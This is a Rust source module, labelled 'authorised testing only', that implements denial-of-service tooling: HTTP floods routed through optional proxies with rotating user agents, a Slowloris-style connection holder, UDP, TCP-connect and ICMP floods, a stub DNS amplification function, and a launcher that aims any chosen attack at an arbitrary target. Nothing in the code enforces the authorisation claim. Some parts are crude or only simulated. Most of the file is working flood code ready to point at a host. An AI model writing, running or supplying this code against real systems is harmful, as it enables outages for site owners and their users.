//! Stress testing module for DDoS simulation (authorised testing only)
//! HTTP flood, Slowloris, UDP flood, SYN flood simulation.

use reqwest::Client;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::{Duration, sleep};
use futures::future::join_all;
use rand::Rng;
use rand::seq::SliceRandom;
use crate::utils::{random_user_agent, build_http_client};

/// HTTP Flood - sends many HTTP requests to a target
pub async fn http_flood(
    target: &str,
    threads: usize,
    duration_secs: u64,
    proxy: Option<&str>,
    rate_limit_rps: Option<u32>,
) -> u64 {
    let client = build_http_client(proxy, 5, &random_user_agent());
    let semaphore = Arc::new(Semaphore::new(threads));
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut request_count = 0u64;

    while tokio::time::Instant::now() < end {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let url = target.to_string();
        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            let _ = c.get(&url).send().await;
        }));
        request_count += 1;
        if let Some(rps) = rate_limit_rps {
            sleep(Duration::from_secs(1) / rps).await;
        }
    }
    join_all(tasks).await;
    request_count
}

/// HTTP Flood with random paths
pub async fn http_flood_random_paths(
    base_url: &str,
    paths: &[String],
    threads: usize,
    duration_secs: u64,
    proxy: Option<&str>,
) -> u64 {
    let client = build_http_client(proxy, 5, &random_user_agent());
    let semaphore = Arc::new(Semaphore::new(threads));
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut request_count = 0u64;

    while tokio::time::Instant::now() < end {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let path = paths.choose(&mut rand::thread_rng()).unwrap_or(&"index.html".to_string()).clone();
        let url = format!("{}/{}", base_url, path);
        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            let _ = c.get(&url).send().await;
        }));
        request_count += 1;
    }
    join_all(tasks).await;
    request_count
}

/// Slowloris attack - open many connections and keep them alive
pub async fn slowloris(target: &str, port: u16, threads: usize, duration_secs: u64) -> usize {
    use tokio::net::TcpStream;
    use tokio::io::AsyncWriteExt;
    
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut handles = vec![];
    let mut connection_count = 0;

    for _ in 0..threads {
        let host = target.to_string();
        let p = port;
        handles.push(tokio::spawn(async move {
            while tokio::time::Instant::now() < end {
                if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", host, p)).await {
                    let _ = stream.write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n").await;
                    sleep(Duration::from_secs(10)).await;
                } else {
                    sleep(Duration::from_secs(1)).await;
                }
            }
        }));
        connection_count += 1;
    }
    join_all(handles).await;
    connection_count
}

/// UDP flood (requires raw socket, limited simulation)
pub async fn udp_flood(target: &str, port: u16, threads: usize, duration_secs: u64, packet_size: usize) -> u64 {
    use tokio::net::UdpSocket;
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut packet_count = 0u64;

    for _ in 0..threads {
        let addr = target.to_string();
        let p = port;
        let psize = packet_size;
        tasks.push(tokio::spawn(async move {
            let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap();
            let target_addr = format!("{}:{}", addr, p);
            let data = vec![0xFF; psize];
            while tokio::time::Instant::now() < end {
                let _ = socket.send_to(&data, &target_addr).await;
            }
        }));
        packet_count += 1;
    }
    join_all(tasks).await;
    packet_count
}

/// SYN flood simulation (using raw sockets not available in safe Rust, simulated)
pub async fn syn_flood_simulated(target: &str, port: u16, threads: usize, duration_secs: u64) -> u64 {
    use tokio::net::TcpStream;
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut connection_attempts = 0;

    for _ in 0..threads {
        let addr = format!("{}:{}", target, port);
        tasks.push(tokio::spawn(async move {
            while tokio::time::Instant::now() < end {
                let _ = TcpStream::connect(&addr).await;
            }
        }));
        connection_attempts += 1;
    }
    join_all(tasks).await;
    connection_attempts
}

/// Advanced HTTP flood with random headers and methods
pub async fn advanced_http_flood(
    target: &str,
    threads: usize,
    duration_secs: u64,
    proxy: Option<&str>,
) -> u64 {
    let client = build_http_client(proxy, 3, &random_user_agent());
    let semaphore = Arc::new(Semaphore::new(threads));
    let methods = vec!["GET", "POST", "HEAD", "PUT", "DELETE"];
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut request_count = 0u64;

    while tokio::time::Instant::now() < end {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let url = target.to_string();
        let method = methods.choose(&mut rand::thread_rng()).unwrap();
        tasks.push(tokio::spawn(async move {
            let _permit = permit;
            let _ = match *method {
                "GET" => c.get(&url).send().await,
                "POST" => c.post(&url).body("data").send().await,
                "HEAD" => c.head(&url).send().await,
                "PUT" => c.put(&url).body("data").send().await,
                "DELETE" => c.delete(&url).send().await,
                _ => c.get(&url).send().await,
            };
        }));
        request_count += 1;
        sleep(Duration::from_millis(10)).await; // small delay
    }
    join_all(tasks).await;
    request_count
}

/// ICMP flood simulation (ping flood)
pub async fn icmp_flood(target: &str, threads: usize, duration_secs: u64) -> u64 {
    use std::process::Command;
    let end = tokio::time::Instant::now() + Duration::from_secs(duration_secs);
    let mut tasks = vec![];
    let mut pings = 0;

    for _ in 0..threads {
        let host = target.to_string();
        tasks.push(tokio::spawn(async move {
            while tokio::time::Instant::now() < end {
                let _ = Command::new("ping")
                    .args(&["-n", "1", "-w", "100", &host])
                    .output();
            }
        }));
        pings += 1;
    }
    join_all(tasks).await;
    pings
}

/// DNS amplification simulation (requires public DNS servers)
pub async fn dns_amplification(target: &str) -> Result<(), String> {
    // Simplified simulation - real implementation requires raw DNS packets
    println!("[SIM] DNS amplification attack against {}", target);
    Err("DNS amplification requires low-level socket access".to_string())
}

/// Stress test launcher - chooses attack type
pub async fn launch_stress_test(
    target: &str,
    attack_type: &str,
    threads: usize,
    duration_secs: u64,
    proxy: Option<&str>,
) -> Result<u64, String> {
    match attack_type {
        "http" => Ok(http_flood(target, threads, duration_secs, proxy, Some(100)).await),
        "http-random" => {
            let paths = vec!["index.html".to_string(), "about.html".to_string(), "contact.html".to_string()];
            Ok(http_flood_random_paths(target, &paths, threads, duration_secs, proxy).await)
        }
        "slowloris" => Ok(slowloris(target, 80, threads, duration_secs).await as u64),
        "udp" => Ok(udp_flood(target, 80, threads, duration_secs, 1024).await),
        "syn" => Ok(syn_flood_simulated(target, 80, threads, duration_secs).await),
        "advanced" => Ok(advanced_http_flood(target, threads, duration_secs, proxy).await),
        "icmp" => Ok(icmp_flood(target, threads, duration_secs).await),
        _ => Err(format!("Unknown attack type: {}", attack_type)),
    }
}